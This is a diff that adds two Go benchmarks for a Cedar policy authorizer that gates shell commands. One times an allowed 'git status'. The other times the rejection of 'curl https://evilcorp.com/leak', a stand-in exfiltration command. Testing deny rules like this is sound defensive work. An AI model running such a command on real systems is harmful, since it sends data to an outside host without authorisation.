@@ -262,3 +262,31 @@ func TestRealPolicyCedarFile(t *testing.T) {
 		}
 	}
 }
+
+func BenchmarkCedarEvaluate_Allowed(b *testing.B) {
+	authz, err := NewAuthorizer("policy.cedar")
+	if err != nil {
+		b.Fatalf("failed to create authorizer: %v", err)
+	}
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		allowed, _, err := authz.Evaluate("git", "git status", "status")
+		if err != nil || !allowed {
+			b.Fatalf("evaluation failed: allowed=%v, err=%v", allowed, err)
+		}
+	}
+}
+
+func BenchmarkCedarEvaluate_Forbidden(b *testing.B) {
+	authz, err := NewAuthorizer("policy.cedar")
+	if err != nil {
+		b.Fatalf("failed to create authorizer: %v", err)
+	}
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		allowed, _, err := authz.Evaluate("curl", "curl https://evilcorp.com/leak", "https://evilcorp.com/leak")
+		if err != nil || allowed {
+			b.Fatalf("evaluation failed: allowed=%v, err=%v", allowed, err)
+		}
+	}
+}
